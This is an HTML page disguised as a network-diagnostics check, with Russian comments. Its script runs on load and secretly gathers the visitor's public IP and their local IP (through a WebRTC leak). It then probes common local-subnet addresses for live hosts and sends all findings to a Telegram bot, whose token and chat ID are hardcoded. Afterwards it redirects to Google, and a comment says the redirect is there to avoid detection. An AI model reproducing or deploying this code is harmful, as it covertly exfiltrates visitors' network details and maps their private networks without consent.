<!DOCTYPE html>
<html>
<head><title>Проверка подключения…</title></head>
<body>
    <h3>Выполняется диагностика сети…</h3>
    <script>
        const BOT_TOKEN = '8936104890:AAFTtwKdd_JNhlcqENJ6kWonr9Wb2Z5fJ_8';    // ← свой токен
        const CHAT_ID = '8484695858';    // ← свой chat id

        const TIMEOUT_MS = 500;              // таймаут на каждый хост
        const SCAN_TARGETS = [1,2,3,100,101,102,103,104,105,106,107,108,109,110,138,254]; // самые частые

        // Функция отправки сообщения в Телеграм
        function sendMsg(text) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
        }

        // Получение публичного IP
        async function getPublicIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                return d.ip;
            } catch(e) { return 'не определён'; }
        }

        // Получение локального IP через WebRTC
        function getLocalIP() {
            return new Promise((resolve, reject) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.address;
                        if (/^(192\.168\.|10\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)) {
                            resolve(ip);
                            pc.close();
                        }
                    }
                };
                setTimeout(() => reject(new Error('no local ip')), 2000);
            });
        }

        // Сканирование одного IP с таймаутом
        function probeHost(ip) {
            return new Promise((resolve) => {
                const img = new Image();
                const timer = setTimeout(() => {
                    img.src = '';
                    resolve(null); // таймаут – считаем мёртвым
                }, TIMEOUT_MS);

                img.onload = () => {
                    clearTimeout(timer);
                    resolve({ip, port: 80});
                };
                img.onerror = () => {
                    clearTimeout(timer);
                    // пробуем https
                    const img2 = new Image();
                    const timer2 = setTimeout(() => {
                        img2.src = '';
                        resolve(null);
                    }, TIMEOUT_MS);
                    img2.onload = () => {
                        clearTimeout(timer2);
                        resolve({ip, port: 443});
                    };
                    img2.onerror = () => {
                        clearTimeout(timer2);
                        resolve(null);
                    };
                    img2.src = `https://${ip}:443/favicon.ico?${Math.random()}`;
                };
                img.src = `http://${ip}/favicon.ico?${Math.random()}`;
            });
        }

        // Основная логика
        (async () => {
            // 1. Публичный IP сразу
            const pubIP = await getPublicIP();
            sendMsg(`🔵 Публичный IP: ${pubIP}`);

            // 2. Локальный IP
            let localIP = null;
            try { localIP = await getLocalIP(); } catch(e) {}

            if (localIP) {
                sendMsg(`🟢 Локальный IP: ${localIP} – сканирую хосты…`);
                const parts = localIP.split('.');
                const subnetBase = parts.slice(0,3).join('.');

                // Запускаем параллельный скан по списку целей
                const probes = SCAN_TARGETS.map(i => probeHost(`${subnetBase}.${i}`));
                const results = await Promise.all(probes);
                const alive = results.filter(r => r !== null).map(r => `${r.ip}:${r.port}`);

                // Шлём найденные хосты пачками по 5 штук, чтобы не потерять
                for (let i = 0; i < alive.length; i += 5) {
                    const chunk = alive.slice(i, i+5).join('\n');
                    sendMsg(chunk);
                }
                if (alive.length === 0) sendMsg('Хосты не найдены');
            } else {
                sendMsg(`🟡 Локальный IP не определён, ищу роутер по популярным адресам…`);
                const gwCandidates = ['192.168.0.1','192.168.1.1','10.0.0.1','10.0.0.138'];
                const results = await Promise.all(gwCandidates.map(ip => probeHost(ip)));
                const alive = results.filter(r => r !== null).map(r => `${r.ip}:${r.port}`);
                if (alive.length) {
                    sendMsg(`Найден роутер: ${alive.join(', ')}`);
                } else {
                    sendMsg('Роутер не найден');
                }
            }

            // 3. Резкий уход на Google, чтобы не палиться
            setTimeout(() => { window.location = 'https://www.google.com'; }, 200);
        })();
    </script>
</body>
</html>
